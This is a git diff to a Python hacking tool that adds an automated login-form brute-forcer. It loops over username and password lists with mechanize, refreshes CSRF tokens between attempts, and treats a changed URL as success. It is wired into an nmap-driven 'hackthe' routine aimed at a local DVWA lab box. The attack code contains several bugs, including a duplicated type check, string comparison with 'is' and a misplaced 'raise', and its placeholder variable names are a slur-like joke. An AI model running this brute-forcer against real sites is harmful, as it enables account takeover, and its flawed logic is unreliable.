@@ -1,5 +1,6 @@
+from pathlib import Path
 from pprint import pprint
-from typing import Optional, List, Set, Union, Dict
+from typing import Optional, List, Set, Union, Dict, Tuple
 
 import mechanize
 import nmap3
@@ -153,51 +154,91 @@ class HttpModule:
 
         self.browser.open(target)
 
-    def bruteforce_login_form(self):
+    # TODO: This method is extremely long... ;_; fugg DDDD:
+    def bruteforce_login_form(
+            self,
+            usernames: Union[Path, List[str]] = None,
+            passwords: Union[Path, List[str]] = None) -> Tuple[str, str]:
+
+        if not usernames:
+            usernames = ['bobby', 'robby', 'admin']
+
+        if not passwords:
+            passwords = ['foobarbazqux', 'wheresthebeef', 'password']
+
+        if isinstance(usernames, Path):
+            raise NotImplementedError("Load usernames from a path...")
+
+        if isinstance(usernames, Path):
+            raise NotImplementedError("Load passwords from a path...")
+
         if not self.has_results():
             self.initial_http_scan()
 
         links = self.browser.links()
         print(type(links[0]))
 
-        forms = self.browser.forms()
-        print(type(forms[0]))
+        all_forms = self.browser.forms()
+        print(type(all_forms[0]))
 
-        daForm: HTMLForm = forms[0]
+        # TODO: What if there are multiple forms? Or 0?
+        form_candidate: HTMLForm = all_forms[0]
 
-        if not (determine_form_type(daForm) is 'login'):
-            raise Exception("Cannot bruteforce this type of form: " + determine_form_type(daForm))
+        if not (determine_form_type(form_candidate) is 'login'):
+            raise Exception("Cannot bruteforce this type of form: " + determine_form_type(form_candidate))
 
-        print("about to bruteforce " + daForm.action)
+        print("about to bruteforce " + form_candidate.action)
 
-        fuzzywuzzycandidates = ['foobar', 'god', 'admin', 'password', 'yuormom']
-
-
-
-        usernameControl: TextControl = daForm.find_control('username')
-        passwordControl: PasswordControl = daForm.find_control('password')
+        seen_urls = {}
+        last_url = self.browser.geturl()
 
         # main fuzzer loop...
         # TODO can we use a different module to handle this?
-        for username in fuzzywuzzycandidates:
-            for password in fuzzywuzzycandidates:
-                combo = (username, password)
-                print("going to try " + ":".join(combo))
+        username: str
+        for username in usernames:
 
-                daForm['username'] = username
-                daForm['password'] = password
+            password: str
+            for password in passwords:
 
-                fuzzingRequest: Request = daForm.click()
+                print()
+                print("going to try {0}".format(":".join((username, password))))
+
+                # TODO: Don't hardcode these input names
+                form_candidate['username'] = username
+                form_candidate['password'] = password
+
+                fuzzingRequest: Request = form_candidate.click()
+
+                # store url we have before we send a request...
+                last_url = self.browser.geturl()
 
                 fuzzingResponse = self.browser.open(url_or_request=fuzzingRequest)
 
-                # pprint(fuzzingResponse)
+                next_url: str = self.browser.geturl()
+                print("response url: " + next_url)
 
-                pprint(self.browser.links())
+                if next_url is not last_url:  # TODO: Formalize this heuristic, and what happens if it fails?
+                    print("Different URL! We will use this as the heuristic that proves this "
+                          "form has been successfully brute-forced!")
+                    return username, password
+
+                # update how many urls we've seen before. not sure what we can use this metric for...
+                if next_url not in seen_urls:
+                    seen_urls[next_url] = 0
+                seen_urls[next_url] += 1
 
                 # TODO analyze response, use heuristics to determine if form post was successful
 
+                # this step is important, it copies the new CSRF token...
+                all_forms = self.browser.forms()
+                if len(all_forms) > 0:
+                    form_candidate = all_forms[0]
+                else:
+                    raise ValueError(f"Got returned 0 forms from {self.browser.geturl()}!")
+
         raise NotImplementedError("todo finish bruteforce form")
+
+    raise ValueError("Did not find credentials!")
 
 
 def hackthe(box: Box) -> Box:
@@ -214,7 +255,9 @@ def hackthe(box: Box) -> Box:
     if box.last_nmap_result().hasHTTPServer():
         print("target has an HTTP server!")
 
-        box.http_scanner.bruteforce_login_form()
+        creds = box.http_scanner.bruteforce_login_form()
+
+        print("Login form creds: ".format(creds))
 
     return box
 
@@ -227,15 +270,19 @@ DVWA = Box('dvwa',
            hostname='localhost')  # TODO can we pass port 6789?
 
 
+# NOTE: If you're trying to bruteforce DVWA box, you must first set up the database manually by going to:
+# http://localhost:6789/setup.php
+
+
 def familyfriendlyWithDummyNMAPresults():
     with open('../data/Horizontall.xml', 'r') as f:
-        dummyNmapResult = NMAPResult(raw_xml=f.read())
+        dummy_nmap_result = NMAPResult(raw_xml=f.read())
 
-    gay1 = dummyNmapResult.isOnline()
+    gay1 = dummy_nmap_result.isOnline()
 
-    gay2 = dummyNmapResult.getServices('ssh')
-    gay3 = dummyNmapResult.hasHTTPServer()
-    gay4 = dummyNmapResult.hasSSH()
+    gay2 = dummy_nmap_result.getServices('ssh')
+    gay3 = dummy_nmap_result.hasHTTPServer()
+    gay4 = dummy_nmap_result.hasSSH()
     print(" >:3c ")
 
 
